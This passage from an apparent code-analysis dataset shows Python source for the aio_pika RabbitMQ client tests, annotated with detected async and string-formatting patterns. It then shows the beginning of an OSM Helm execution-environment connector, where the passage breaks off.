with incoming_message.process(\n                    requeue=True, reject_on_redelivered=True\n                ):\n                    raise Exception\n            self.assertTrue(message_logger.info.called)\n            self.assertEqual(\n                message_logger.info.mock_calls[0][1][1].body,\n                incoming_message.body\n            )\n        self.assertEqual(incoming_message.body, body)\n        await queue.unbind(exchange, routing_key)\n    async def test_no_ack_redelivery(self):\n        client = await self.create_connection()\n        queue_name = self.get_random_name(\"test_connection\")\n        routing_key = self.get_random_name()\n        channel = await client.channel()\n        exchange = await channel.declare_exchange('direct', auto_delete=True)\n        queue = await channel.declare_queue(queue_name, auto_delete=False)\n        await queue.bind(exchange, routing_key)\n        for _ in range(2):\n            body = bytes(shortuuid.uuid(), 'utf-8')\n            msg = Message(body)\n            await exchange.publish(msg, routing_key)\n        first_message = await queue.get(timeout=5)\n        last_message = await queue.get(timeout=5)\n        last_message.ack()\n        await channel.close()\n        channel = await client.channel()\n        exchange = await channel.declare_exchange('direct', auto_delete=True)\n        queue = await channel.declare_queue(queue_name, auto_delete=False)\n        message = await queue.get(timeout=5)\n        self.assertEqual(message.body, first_message.body)\n        message.ack()\n        await queue.unbind(exchange, routing_key)\n    async def test_ack_multiple(self):\n        client = await self.create_connection()\n        queue_name = self.get_random_name(\"test_connection\")\n        routing_key = self.get_random_name()\n        channel = await client.channel()\n        exchange = await channel.declare_exchange('direct', auto_delete=True)\n        queue = await channel.declare_queue(queue_name, auto_delete=False)\n        await queue.bind(exchange, routing_key)\n        for _ in range(2):\n            body = bytes(shortuuid.uuid(), 'utf-8')\n            msg = Message(body)\n            await exchange.publish(msg, routing_key)\n        await queue.get(timeout=5)\n        last_message = await queue.get(timeout=5)\n        last_message.ack(multiple=True)\n        await channel.close()\n        channel = await client.channel()\n        exchange = await channel.declare_exchange('direct', auto_delete=True)\n        queue = await channel.declare_queue(queue_name, auto_delete=False)\n        with pytest.raises(aio_pika.exceptions.QueueEmpty):\n            await queue.get()\n        await queue.unbind(exchange, routing_key)\n        await queue.delete()\n        await asyncio.wait((client.close(), client.closing), loop=self.loop)\n    async def test_ack_twice(self):\n        client = await self.create_connection()\n        queue_name = self.get_random_name(\"test_connection\")\n        routing_key = self.get_random_name()\n        channel = await client.channel()\n        exchange = await channel.declare_exchange('direct', auto_delete=True)\n        queue = await channel.declare_queue(queue_name, auto_delete=True)\n        await queue.bind(exchange, routing_key)\n        body = bytes(shortuuid.uuid(), 'utf-8')\n        await exchange.publish(\n            Message(\n                body, content_type='text/plain',\n                headers={'foo': 'bar'}\n            ),\n            routing_key\n        )\n        incoming_message = await queue.get(timeout=5)\n        incoming_message.ack()\n        with pytest.raises(MessageProcessError):\n            incoming_message.ack()\n        self.assertEqual(incoming_message.body, body)\n        await queue.unbind(exchange, routing_key)\n        await queue.delete()\n        await asyncio.wait((client.close(), client.closing), loop=self.loop)\n    async def test_reject_twice(self):\n        client = await self.create_connection()\n        queue_name = self.get_random_name(\"test_connection\")\n        routing_key = self.get_random_name()\n        channel = await client.channel()\n        exchange = await channel.declare_exchange('direct', auto_delete=True)\n        queue = await channel.declare_queue(queue_name, auto_delete=True)\n        await queue.bind(exchange, routing_key)\n        body = bytes(shortuuid.uuid(), 'utf-8')\n        await exchange.publish(\n            Message(\n                body, content_type='text/plain',\n                headers={'foo': 'bar'}\n            ),\n            routing_key\n        )\n        incoming_message = await queue.get(timeout=5)\n        incoming_message.reject(requeue=False)\n        with pytest.raises(MessageProcessError):\n            incoming_message.reject(requeue=False)\n        self.assertEqual(incoming_message.body, body)\n        await queue.unbind(exchange, routing_key)\n        await queue.delete()\n        await asyncio.wait((client.close(), client.closing), loop=self.loop)\n    async def test_consuming(self):\n        client = await self.create_connection()\n        queue_name = self.get_random_name(\"tc2\")\n        routing_key = self.get_random_name()\n        channel = await client.channel()\n        exchange = await channel.declare_exchange('direct', auto_delete=True)\n        queue = await channel.declare_queue(queue_name, auto_delete=True)\n        await queue.bind(exchange, routing_key)\n        body = bytes(shortuuid.uuid(), 'utf-8')\n        f = asyncio.Future(loop=self.loop)\n        async def handle(message):\n            message.ack()\n            self.assertEqual(message.body, body)\n            self.assertEqual(message.routing_key, routing_key)\n            f.set_result(True)\n        await queue.consume(handle)\n        await exchange.publish(\n            Message(\n                body, content_type='text/plain',\n                headers={'foo': 'bar'}\n            ),\n            routing_key\n        )\n        if not f.done():\n            await f\n        await queue.unbind(exchange, routing_key)\n        await exchange.delete()\n        await asyncio.wait((client.close(), client.closing), loop=self.loop)\n    async def test_consuming_not_coroutine(self):\n        client = await self.create_connection()\n        queue_name = self.get_random_name(\"tc2\")\n        routing_key = self.get_random_name()\n        channel = await client.channel()\n        exchange = await channel.declare_exchange('direct', auto_delete=True)\n        queue = await channel.declare_queue(queue_name, auto_delete=True)\n        await queue.bind(exchange, routing_key)\n        body = bytes(shortuuid.uuid(), 'utf-8')\n        f = asyncio.Future(loop=self.loop)\n        def handle(message):\n            message.ack()\n            self.assertEqual(message.body, body)\n            self.assertEqual(message.routing_key, routing_key)\n            f.set_result(True)\n        await queue.consume(handle)\n        await exchange.publish(\n            Message(\n                body, content_type='text/plain',\n                headers={'foo': 'bar'}\n            ),\n            routing_key\n        )\n        if not f.done():\n            await f\n        await queue.unbind(exchange, routing_key)\n        await exchange.delete()\n        await asyncio.wait((client.close(), client.closing), loop=self.loop)\n    async def test_ack_reject(self):\n        client = await self.create_connection()\n        queue_name = self.get_random_name(\"test_connection3\")\n        routing_key = self.get_random_name()\n        channel = await client.channel()\n        exchange = await channel.declare_exchange('direct', auto_delete=True)\n        queue = await channel.declare_queue(queue_name, auto_delete=True)\n        await queue.bind(exchange, routing_key)\n        body = bytes(shortuuid.uuid(), 'utf-8')\n        await exchange.publish(\n            Message(\n                body,\n                content_type='text/plain',\n                headers={'foo': 'bar'}\n            ),\n            routing_key\n        )\n        incoming_message = await queue.get(timeout=5, no_ack=True)\n        with pytest.raises(TypeError):\n            incoming_message.ack()\n        await exchange.publish(\n            Message(\n                body,\n                content_type='text/plain',\n                headers={'foo': 'bar'}\n            ),\n            routing_key\n        )\n        incoming_message = await queue.get(timeout=5)\n        incoming_message.reject()\n        await exchange.publish(\n            Message(\n                body,\n                content_type='text/plain',\n                headers={'foo': 'bar'}\n            ),\n            routing_key\n        )\n        incoming_message = await queue.get(timeout=5, no_ack=True)\n        with pytest.raises(TypeError):\n            await incoming_message.reject()\n        self.assertEqual(incoming_message.body, body)\n        await queue.unbind(exchange, routing_key)\n        await queue.delete()\n        await asyncio.wait((client.close(), client.closing), loop=self.loop)\n    async def test_purge_queue(self):\n        queue_name = self.get_random_name(\"test_connection4\")\n        routing_key = self.get_random_name()\n        channel = await self.create_channel()\n        exchange = await channel.declare_exchange('direct', auto_delete=True)\n        queue = await channel.declare_queue(queue_name, auto_delete=True)\n        await queue.bind(exchange, routing_key)\n        try:\n            body = bytes(shortuuid.uuid(), 'utf-8')\n            await exchange.publish(\n                Message(\n                    body, content_type='text/plain',\n                    headers={'foo': 'bar'}\n                ),\n                routing_key\n            )\n            await queue.purge()\n            with pytest.raises(asyncio.TimeoutError):\n                await queue.get(timeout=1)\n        except aio_pika.exceptions.QueueEmpty:\n            await queue.unbind(exchange, routing_key)\n            await queue.delete()\n    async def test_connection_refused(self):\n        with pytest.raises(ConnectionError):\n            await connect('amqp://guest:guest@localhost:9999', loop=self.loop)\n    async def test_wrong_credentials(self):\n        amqp_url = AMQP_URL.with_user(\n            uuid.uuid4().hex\n        ).with_password(\n            uuid.uuid4().hex\n        )\n        with pytest.raises(ProbableAuthenticationError):\n            await connect(str(amqp_url), loop=self.loop)\n    async def test_set_qos(self):\n        channel = await self.create_channel()\n        await channel.set_qos(prefetch_count=1, all_channels=True)\n    async def test_exchange_delete(self):\n        channel = await self.create_channel()\n        exchange = await channel.declare_exchange(\"test\", auto_delete=True)\n        await exchange.delete()\n    async def test_dlx(self):\n        suffix = self.get_random_name()\n        routing_key = \"%s_routing_key\" % suffix\n        dlx_routing_key = \"%s_dlx_routing_key\" % suffix\n        channel = await self.create_channel()\n        f = asyncio.Future(loop=self.loop)\n        async def dlx_handle(message):\n            message.ack()\n            self.assertEqual(message.body, body)\n            self.assertEqual(message.routing_key, dlx_routing_key)\n            f.set_result(True)\n        direct_exchange = await self.declare_exchange(\n            'direct', channel=channel, auto_delete=True\n        )  \n        dlx_exchange = await channel.declare_exchange(\n            'dlx', ExchangeType.DIRECT, auto_delete=True\n        )\n        direct_queue = await channel.declare_queue(\n            \"%s_direct_queue\" % suffix,\n            auto_delete=True,\n            arguments={\n                'x-message-ttl': 300,\n                'x-dead-letter-exchange': 'dlx',\n                'x-dead-letter-routing-key': dlx_routing_key\n            }\n        )\n        dlx_queue = await channel.declare_queue(\n            \"%s_dlx_queue\" % suffix,\n            auto_delete=True\n        )\n        await dlx_queue.consume(dlx_handle)\n        await dlx_queue.bind(dlx_exchange, dlx_routing_key)\n        await direct_queue.bind(direct_exchange, routing_key)\n        body = bytes(shortuuid.uuid(), 'utf-8')\n        try:\n            await direct_exchange.publish(\n                Message(\n                    body,\n                    content_type='text/plain',\n                    headers={\n                        'x-message-ttl': 100,\n                        'x-dead-letter-exchange': 'dlx',\n                    }\n                ),\n                routing_key\n            )\n            if not f.done():\n                await f\n        finally:\n            await dlx_queue.unbind(dlx_exchange, routing_key)\n            await direct_queue.unbind(direct_exchange, routing_key)\n            await direct_queue.delete()\n            await direct_exchange.delete()\n            await dlx_exchange.delete()\n    async def test_connection_close(self):\n        client = await self.create_connection()\n        routing_key = self.get_random_name()\n        channel = await client.channel()    \n        exchange = await channel.declare_exchange('direct', auto_delete=True)\n        try:\n            with pytest.raises(aio_pika.exceptions.ChannelPreconditionFailed):\n                msg = Message(bytes(shortuuid.uuid(), 'utf-8'))\n                msg.delivery_mode = 8\n                await exchange.publish(msg, routing_key)\n            channel = await client.channel()\n            exchange = await channel.declare_exchange(\n                'direct', auto_delete=True\n            )\n        finally:\n            await exchange.delete()\n            await asyncio.wait((client.close(), client.closing), loop=self.loop)\n    async def test_basic_return(self):\n        client = await self.create_connection()\n        channel = await client.channel()   \n        f = asyncio.Future(loop=self.loop)\n        channel.add_on_return_callback(f.set_result)\n        body = bytes(shortuuid.uuid(), 'utf-8')\n        await channel.default_exchange.publish(\n            Message(\n                body,\n                content_type='text/plain',\n                headers={'foo': 'bar'}\n            ),\n            self.get_random_name(\"test_basic_return\")\n        )\n        returned = await f\n        self.assertEqual(returned.body, body)\n        f = asyncio.Future(loop=self.loop)\n        await channel.close()\n        channel = await client.channel()  \n        def bad_handler(message):\n            try:\n                raise ValueError\n            finally:\n                f.set_result(message)\n        channel.add_on_return_callback(bad_handler)\n        body = bytes(shortuuid.uuid(), 'utf-8')\n        await channel.default_exchange.publish(\n            Message(\n                body,\n                content_type='text/plain',\n                headers={'foo': 'bar'}\n            ),\n            self.get_random_name(\"test_basic_return\")\n        )\n        returned = await f\n        self.assertEqual(returned.body, body)\n        await asyncio.wait((client.close(), client.closing), loop=self.loop)\n    async def test_expiration(self):\n        client = await self.create_connection()\n        channel = await client.channel()  \n        dlx_queue = await channel.declare_queue(\n            self.get_random_name(\"test_dlx\")\n        )   \n        dlx_exchange = await channel.declare_exchange(\n            self.get_random_name(\"dlx\"),\n        )   \n        await dlx_queue.bind(dlx_exchange, routing_key=dlx_queue.name)\n        queue = await channel.declare_queue(\n            self.get_random_name(\"test_expiration\"),\n            arguments={\n                \"x-message-ttl\": 10000,\n                \"x-dead-letter-exchange\": dlx_exchange.name,\n                \"x-dead-letter-routing-key\": dlx_queue.name,\n            }\n        )  \n        body = bytes(shortuuid.uuid(), 'utf-8')\n        await channel.default_exchange.publish(\n            Message(\n                body,\n                content_type='text/plain',\n                headers={'foo': 'bar'},\n                expiration=0.5\n            ),\n            queue.name\n        )\n        f = asyncio.Future(loop=self.loop)\n        await dlx_queue.consume(f.set_result, no_ack=True)\n        message = await f\n        self.assertEqual(message.body, body)\n        self.assertEqual(\n            message.headers['x-death'][0]['original-expiration'], b'500'\n        )\n        await asyncio.wait((client.close(), client.closing), loop=self.loop)\n    async def test_add_close_callback(self):\n        client = await self.create_connection()\n        shared_list = []\n        def share(*a, **kw):\n            shared_list.append((a, kw))\n        client.add_close_callback(share)\n        await client.close()\n        self.assertEqual(len(shared_list), 1)\n    async def test_big_message(self):\n        client = await self.create_connection()\n        queue_name = self.get_random_name(\"test_big\")\n        routing_key = self.get_random_name()\n        channel = await client.channel()\n        exchange = await channel.declare_exchange('direct', auto_delete=True)\n        queue = await channel.declare_queue(queue_name, auto_delete=True)\n        await queue.bind(exchange, routing_key)\n        body = bytes(shortuuid.uuid(), 'utf-8') * 9999999\n        await exchange.publish(\n            Message(\n                body, content_type='text/plain',\n                headers={'foo': 'bar'}\n            ),\n            routing_key\n        )\n        incoming_message = await queue.get(timeout=5)\n        incoming_message.ack()\n        self.assertEqual(incoming_message.body, body)\n        await queue.unbind(exchange, routing_key)\n        await queue.delete()\n        await asyncio.wait((client.close(), client.closing), loop=self.loop)\n    async def test_unexpected_channel_close(self):\n        client = await self.create_connection()\n        channel = await client.channel()\n        with pytest.raises(aio_pika.exceptions.ChannelClosed):\n            await channel.declare_queue(\"amq.restricted_queue_name\",\n                                        auto_delete=True)\n        await asyncio.wait((client.close(), client.closing), loop=self.loop)\n    async def test_declaration_result(self):\n        client = await self.create_connection()\n        channel = await client.channel()\n        queue = await channel.declare_queue(auto_delete=True)\n        self.assertEqual(queue.declaration_result.message_count, 0)\n        self.assertEqual(queue.declaration_result.consumer_count, 0)\n        await asyncio.wait((client.close(), client.closing), loop=self.loop)\n    async def test_declaration_result_with_consumers(self):\n        client = await self.create_connection()\n        channel1 = await client.channel()\n        queue_name = self.get_random_name(\"queue\", \"declaration-result\")\n        queue1 = await channel1.declare_queue(queue_name, auto_delete=True)\n        await queue1.consume(print)\n        channel2 = await client.channel()\n        queue2 = await channel2.declare_queue(queue_name, passive=True)\n        self.assertEqual(queue2.declaration_result.consumer_count, 1)\n        await asyncio.wait((client.close(), client.closing), loop=self.loop)\n    async def test_declaration_result_with_messages(self):\n        client = await self.create_connection()\n        channel1 = await client.channel()\n        channel2 = await client.channel()\n        queue_name = self.get_random_name(\"queue\", \"declaration-result\")\n        queue1 = await channel1.declare_queue(queue_name, auto_delete=True)\n        await channel1.default_exchange.publish(\n            Message(body=b'test'),\n            routing_key=queue1.name\n        )\n        queue2 = await channel2.declare_queue(queue_name, passive=True)\n        await queue2.get()\n        await queue2.delete()\n        self.assertEqual(queue2.declaration_result.consumer_count, 0)\n        self.assertEqual(queue2.declaration_result.message_count, 1)\n        await asyncio.wait((client.close(), client.closing), loop=self.loop)\n    async def test_queue_empty_exception(self):\n        client = await self.create_connection()\n        queue_name = self.get_random_name(\"test_get_on_empty_queue\")\n        channel = await client.channel()\n        queue = await channel.declare_queue(queue_name, auto_delete=True)\n        with pytest.raises(aio_pika.exceptions.QueueEmpty):\n            await queue.get(timeout=5)\n        await channel.default_exchange.publish(\n            Message(b'test'),\n            queue_name,\n        )\n        message = await queue.get(timeout=5)\n        self.assertEqual(message.body, b'test')\n        with pytest.raises(aio_pika.exceptions.QueueEmpty):\n            await queue.get(timeout=5)\n        await queue.delete()\n        await asyncio.wait((client.close(), client.closing), loop=self.loop)\n    async def test_queue_empty_fail_false(self):\n        client = await self.create_connection()\n        queue_name = self.get_random_name(\"test_get_on_empty_queue\")\n        channel = await client.channel()\n        queue = await channel.declare_queue(queue_name, auto_delete=True)\n        result = await queue.get(fail=False)\n        self.assertIsNone(result)\n        await queue.delete()\n        await asyncio.wait((client.close(), client.closing), loop=self.loop)\n    async def test_message_nack(self):\n        client = await self.create_connection()\n        queue_name = self.get_random_name(\"test_nack_queue\")\n        body = uuid.uuid4().bytes\n        channel = await client.channel()\n        queue = await channel.declare_queue(queue_name, auto_delete=True)\n        await channel.default_exchange.publish(\n            Message(body=body), routing_key=queue_name\n        )\n        message = await queue.get()    \n        self.assertEqual(message.body, body)\n        message.nack(requeue=True)\n        message = await queue.get()\n        self.assertTrue(message.redelivered)\n        self.assertEqual(message.body, body)\n        message.ack()\n        await queue.delete()\n        await asyncio.wait((client.close(), client.closing), loop=self.loop)\n    async def test_on_return_raises(self):\n        client = await self.create_connection()\n        queue_name = self.get_random_name(\"test_on_return_raises\")\n        body = uuid.uuid4().bytes\n        with pytest.raises(RuntimeError):\n            await client.channel(\n                publisher_confirms=False, on_return_raises=True\n            )\n        channel = await client.channel(\n            publisher_confirms=True, on_return_raises=True\n        )\n        for _ in range(100):\n            with pytest.raises(aio_pika.exceptions.DeliveryError):\n                await channel.default_exchange.publish(\n                    Message(body=body), routing_key=queue_name,\n                )\n        await client.close()\n    async def test_transaction_when_publisher_confirms_error(self):\n        channel = await self.create_channel(publisher_confirms=True)\n        with pytest.raises(RuntimeError):\n            channel.transaction()\n    async def test_transaction_simple_commit(self):\n        channel = await self.create_channel(publisher_confirms=False)\n        tx = channel.transaction()\n        await tx.select()\n        await tx.commit()\n    async def test_transaction_simple_rollback(self):\n        channel = await self.create_channel(publisher_confirms=False)\n        tx = channel.transaction()\n        await tx.select()\n        await tx.rollback()\n    async def test_transaction_simple_async_commit(self):\n        channel = await self.create_channel(publisher_confirms=False)\n        async with channel.transaction():\n            pass\n    async def test_transaction_simple_async_rollback(self):\n        channel = await self.create_channel(publisher_confirms=False)\n        with pytest.raises(ValueError):\n            async with channel.transaction():\n                raise ValueError\n    async def test_async_for_queue(self):\n        conn = await self.create_connection()\n        channel2 = await self.create_channel(connection=conn)\n        queue = await channel2.declare_queue(\n            self.get_random_name(\"queue\", \"is_async\", \"for\"), auto_delete=True)\n        messages = 100\n        async def publisher():\n            channel1 = await self.create_channel(connection=conn)\n            for i in range(messages):\n                await channel1.default_exchange.publish(\n                    Message(body=str(i).encode()), routing_key=queue.name\n                )\n        self.loop.create_task(publisher())\n        count = 0\n        data = list()\n        async for message in queue:\n            async with message.process():\n                count += 1\n                data.append(message.body)\n            if count >= messages:\n                break\n        self.assertSequenceEqual(data, list(\n            map(lambda x: str(x).encode(), range(messages))))\n    async def test_async_for_queue_context(self):\n        conn = await self.create_connection()\n        channel2 = await self.create_channel(connection=conn)\n        queue = await channel2.declare_queue(\n            self.get_random_name(\"queue\", \"is_async\", \"for\"), auto_delete=True)\n        messages = 100\n        async def publisher():\n            channel1 = await self.create_channel(connection=conn)\n            for i in range(messages):\n                await channel1.default_exchange.publish(\n                    Message(body=str(i).encode()), routing_key=queue.name)\n        self.loop.create_task(publisher())\n        count = 0\n        data = list()\n        async with queue.iterator() as queue_iterator:\n            async for message in queue_iterator:\n                async with message.process():\n                    count += 1\n                    data.append(message.body)\n                if count >= messages:\n                    break\n        self.assertSequenceEqual(data, list(\n            map(lambda x: str(x).encode(), range(messages))))\n    async def test_async_with_connection(self):\n        conn = await self.create_connection(cleanup=False)\n        async with conn:\n            channel2 = await self.create_channel(\n                connection=conn, cleanup=False\n            )\n            queue = await channel2.declare_queue(\n                self.get_random_name(\"queue\", \"is_async\", \"for\"),\n                auto_delete=True)\n            messages = 100\n            async def publisher():\n                channel1 = await self.create_channel(connection=conn,\n                                                     cleanup=False)\n                for i in range(messages):\n                    await channel1.default_exchange.publish(\n                        Message(body=str(i).encode()),\n                        routing_key=queue.name\n                    )\n            self.loop.create_task(publisher())\n            count = 0\n            data = list()\n            async with queue.iterator() as queue_iterator:\n                async for message in queue_iterator:\n                    async with message.process():\n                        count += 1\n                        data.append(message.body)\n                    if count >= messages:\n                        break\n            self.assertSequenceEqual(data, list(\n                map(lambda x: str(x).encode(), range(messages))))\n        self.assertTrue(channel2.is_closed)\n    async def test_async_with_channel(self):\n        conn = await self.create_connection()\n        async with conn.channel() as channel:\n            self.assertTrue(isinstance(channel, Channel))\n        self.assertTrue(channel.is_closed)\n    async def test_delivery_fail(self):\n        channel = await self.create_channel(publisher_confirms=True)\n        queue = await channel.declare_queue(exclusive=True, arguments={\n            'x-max-length': 1,\n            'x-overflow': 'reject-publish',\n        }, auto_delete=True)\n        await channel.default_exchange.publish(\n            aio_pika.Message(body=b'queue me'),\n            routing_key=queue.name\n        )\n        with pytest.raises(DeliveryError):\n            for _ in range(10):\n                await channel.default_exchange.publish(\n                    aio_pika.Message(body=b'reject me'),\n                    routing_key=queue.name\n                )\n    async def test_channel_locked_resource(self):\n        ch1 = await self.create_channel()\n        ch2 = await self.create_channel()\n        qname = self.get_random_name(\"channel\", \"locked\", \"resource\")\n        q1 = await ch1.declare_queue(qname, exclusive=True)\n        await q1.consume(print, exclusive=True)\n        with self.assertRaises(ChannelLockedResource):\n            q2 = await ch2.declare_queue(qname, exclusive=True)\n            await q2.consume(print, exclusive=True)\n    async def test_queue_iterator_close_is_called_twice(self):\n        logger = logging.getLogger().getChild(self.get_random_name(\"logger\"))\n        async def task_inner():\n            nonlocal logger\n            try:\n                connection = await self.create_connection()\n                async with connection:\n                    channel = await connection.channel()\n                    queue = await channel.declare_queue('test')\n                    async with queue.iterator() as q:\n                        async for message in q:\n                            with message.process():\n                                break\n            except Exception:\n                logger.exception(\"Error\")\n                raise\n        task = self.loop.create_task(task_inner())\n        self.loop.call_later(1, task.cancel)\n        with self.assertLogs(logger):\n            with self.assertRaises(asyncio.CancelledError):\n                await task\nclass MessageTestCase(unittest.TestCase):\n    def test_message_copy(self):\n        msg1 = Message(\n            bytes(shortuuid.uuid(), 'utf-8'),\n            content_type='application/json',\n            content_encoding='text',\n            timestamp=datetime(2000, 1, 1),\n            headers={'h1': 'v1', 'h2': 'v2'},\n        )\n        msg2 = copy(msg1)\n        msg1.lock()\n        self.assertFalse(msg2.locked)\n    def test_message_info(self):\n        body = bytes(shortuuid.uuid(), 'utf-8')\n        info = {\n            'headers': {\"foo\": b\"bar\"},\n            'content_type': \"application/json\",\n            'content_encoding': \"text\",\n            'delivery_mode': DeliveryMode.PERSISTENT.value,\n            'priority': 0,\n            'correlation_id': '1',\n            'reply_to': 'test',\n            'expiration': 1.5,\n            'message_id': shortuuid.uuid(),\n            'timestamp': datetime.utcfromtimestamp(int(time.time())),\n            'type': '0',\n            'user_id': 'guest',\n            'app_id': 'test',\n            'body_size': len(body)\n        }\n        msg = Message(\n            body=body,\n            headers={'foo': b'bar'},\n            content_type='application/json',\n            content_encoding='text',\n            delivery_mode=DeliveryMode.PERSISTENT,\n            priority=0,\n            correlation_id=1,\n            reply_to='test',\n            expiration=1.5,\n            message_id=info['message_id'],\n            timestamp=info['timestamp'],\n            type='0',\n            user_id='guest',\n            app_id='test'\n        )\n        self.assertDictEqual(info, msg.info())\n    def test_headers_content(self):\n        data = (\n            [42, 42, 42],\n            ['foo', b'foo', 'foo'],\n            [b'\\00', b'\\00', '\\00'],\n        )\n        for src, raw, value in data:\n            msg = Message(b'', headers={'value': src})\n            self.assertEqual(\n                msg.headers_raw['value'], raw, \"%r != %r\" % (src, raw)\n            )\n            self.assertEqual(\n                msg.headers['value'], value, \"%r != %r\" % (src, value)\n            )",
            "patterns": {
                "pep_567": [
                    [
                        1,
                        1,
                        "import",
                        "import asyncio"
                    ]
                ],
                "pep_525": [
                    [
                        942,
                        947,
                        "async for",
                        "async for message in queue:\n            async with message.process():\n                count += 1\n                data.append(message.body)\n            if count >= messages:\n                break"
                    ],
                    [
                        965,
                        970,
                        "async for",
                        "async for message in queue_iterator:\n                async with message.process():\n                    count += 1\n                    data.append(message.body)\n                if count >= messages:\n                    break"
                    ],
                    [
                        995,
                        1000,
                        "async for",
                        "async for message in queue_iterator:\n                    async with message.process():\n                        count += 1\n                        data.append(message.body)\n                    if count >= messages:\n                        break"
                    ],
                    [
                        1044,
                        1046,
                        "async for",
                        "async for message in q:\n                            with message.process():\n                                break"
                    ]
                ],
                "pep_498v": [
                    [
                        631,
                        631,
                        "%"
                    ],
                    [
                        632,
                        632,
                        "%"
                    ],
                    [
                        647,
                        647,
                        "%"
                    ],
                    [
                        656,
                        656,
                        "%"
                    ],
                    [
                        1111,
                        1111,
                        "%"
                    ],
                    [
                        1114,
                        1114,
                        "%"
                    ]
                ]
            }
        },
        "94": {
            "file": "import functools\nimport yaml\nimport asyncio\nimport socket\nimport uuid\nfrom grpclib.client import Channel\nfrom osm_lcm.frontend_pb2 import PrimitiveRequest\nfrom osm_lcm.frontend_pb2 import SshKeyRequest, SshKeyReply\nfrom osm_lcm.frontend_grpc import FrontendExecutorStub\nfrom n2vc.n2vc_conn import N2VCConnector\nfrom n2vc.k8s_helm_conn import K8sHelmConnector\nfrom n2vc.exceptions import N2VCBadArgumentsException, N2VCException, N2VCExecutionException\nfrom osm_lcm.lcm_utils import deep_get\ndef retryer(max_wait_time=60, delay_time=10):\n    def wrapper(func):\n        retry_exceptions = (\n            ConnectionRefusedError\n        )\n        @functools.wraps(func)\n        async def wrapped(*args, **kwargs):\n            wait_time = max_wait_time\n            while wait_time > 0:\n                try:\n                    return await func(*args, **kwargs)\n                except retry_exceptions:\n                    wait_time = wait_time - delay_time\n                    await asyncio.sleep(delay_time)\n                    continue\n            else:\n                return ConnectionRefusedError\n        return wrapped\n    return wrapper\nclass LCMHelmConn(N2VCConnector):\n    _KUBECTL_OSM_NAMESPACE = \"osm\"\n    _KUBECTL_OSM_CLUSTER_NAME = \"_system-osm-k8s\"\n    _EE_SERVICE_PORT = 50050\n    _EE_RETRY_DELAY = 10\n    _MAX_INITIAL_RETRY_TIME = 300\n    _MAX_RETRY_TIME = 30\n    def __init__(self,\n                 db: object,\n                 fs: object,\n                 log: object = None,\n                 loop: object = None,\n                 url: str = None,\n                 username: str = None,\n                 vca_config: dict = None,\n                 on_update_db=None, ):\n        N2VCConnector.__init__(\n            self,\n            db=db,\n            fs=fs,\n            log=log,\n            loop=loop,\n            url=url,\n            username=username,\n            vca_config=vca_config,\n            on_update_db=on_update_db,\n        )\n        self.log.debug(\"Initialize helm N2VC connector\")\n        self._ee_service_port = self._EE_SERVICE_PORT\n        self._retry_delay = self._EE_RETRY_DELAY\n        self._max_retry_time = self._MAX_RETRY_TIME\n        self._initial_retry_time = self._MAX_INITIAL_RETRY_TIME\n        self._k8sclusterhelm = K8sHelmConnector(\n            kubectl_command=self.vca_config.get(\"kubectlpath\"),\n            helm_command=self.vca_config.get(\"helmpath\"),\n            fs=self.fs,\n            log=self.log,\n            db=self.db,\n            on_update_db=None,\n        )\n        self._system_cluster_id = None\n        self.log.info(\"Helm N2VC connector initialized\")\n    async def create_execution_environment(self,\n                                           namespace: str,\n                                           db_dict: dict,\n                                           reuse_ee_id: str = None,\n                                           progress_timeout: float = None,\n                                           total_timeout: float = None,\n                                           config: dict = None,\n                                           artifact_path: str = None,\n                                           vca_type: str = None) -> (str, dict):\n        self.log.info(\n            \"create_execution_environment: namespace: {}, artifact_path: {}, db_dict: {}, \"\n            \"reuse_ee_id: {}\".format(\n                namespace, artifact_path, db_dict, reuse_ee_id)\n        )\n        if artifact_path is None or len(artifact_path) == 0:\n            raise N2VCBadArgumentsException(\n                message=\"artifact_path is mandatory\", bad_args=[\"artifact_path\"]\n            )\n        while artifact_path.find(\"//\") >= 0:\n            artifact_path = artifact_path.replace(\"//\", \"/\")\n        if self.fs.file_exists(artifact_path):\n            helm_chart_path = artifact_path\n        else:\n            msg = \"artifact path does not exist: {}\".format(artifact_path)\n            raise N2VCBadArgumentsException(message=msg, bad_args=[\"artifact_path\"])\n        if artifact_path.startswith(\"/\"):\n            full_path = self.fs.path + helm_chart_path\n        else:\n            full_path = self.fs.path + \"/\" + helm_chart_path\n        try:\n            system_cluster_uuid = self._get_system_cluster_id()\n            if config and config.get(\"osm\"):\n                if not config.get(\"global\"):\n                    config[\"global\"] = {}\n                config[\"global\"][\"osm\"] = config.get(\"osm\")\n            self.log.debug(\"install helm chart: {}\".format(full_path))\n            helm_id = await self._k8sclusterhelm.install(system_cluster_uuid, kdu_model=full_path,\n                                                         namespace=self._KUBECTL_OSM_NAMESPACE,\n                                                         params=config,\n                                                         db_dict=db_dict,\n                                                         timeout=progress_timeout)\n            ee_id = \"{}.{}\".format(self._KUBECTL_OSM_NAMESPACE, helm_id)\n            return ee_id, None\n        except N2VCException:\n            raise\n        except Exception as e:\n            self.log.error(\"Error deploying chart ee: {}\".format(e), exc_info=True)\n            raise N2VCException(\"Error deploying chart ee: {}\".format(e))\n    async def register_execution_environment(self, namespace: str, credentials: dict, db_dict: dict,\n                                             progress_timeout: float = None, total_timeout: float = None) -> str:\n        pass\n    async def install_configuration_sw(self,\n                                       ee_id: str,\n                                       artifact_path: str,\n                                       db_dict: dict,\n                                       progress_timeout: float = None,\n                                       total_timeout: float = None,\n                                       config: dict = None,\n                                       num_units: int = 1,\n                                       vca_type: str = None\n                                       ):\n        pass\n    async def add_relation(self, ee_id_1: str, ee_id_2: str, endpoint_1: str, endpoint_2: str):\n        pass\n    async def remove_relation(self):\n        pass\n    async def get_status(self, namespace: str, yaml_format: bool = True):\n        pass\n    async def get_ee_ssh_public__key(self, ee_id: str, db_dict: dict, progress_timeout: float = None,\n                                     total_timeout: float = None) -> str:\n        self.log.info(\n            \"get_ee_ssh_public_key: ee_id: {}, db_dict: {}\".format(\n                ee_id, db_dict)\n        )\n        if ee_id is None or len(ee_id) == 0:\n            raise N2VCBadArgumentsException(\n                message=\"ee_id is mandatory\", bad_args=[\"ee_id\"]\n            )\n        try:\n            namespace, helm_id = self._get_ee_id_parts(ee_id)\n            ip_addr = socket.gethostbyname(helm_id)\n            ssh_key = await self._get_ssh_key(ip_addr)\n            return ssh_key\n        except Exception as e:\n            self.log.error(\"Error obtaining ee ssh_key: {}\".format(e), exc_info=True)\n            raise N2VCException(\"Error obtaining ee ssh_ke: {}\".format(e))\n    async def exec_primitive(self, ee_id: str, primitive_name: str, params_dict: dict, db_dict: dict = None,\n                             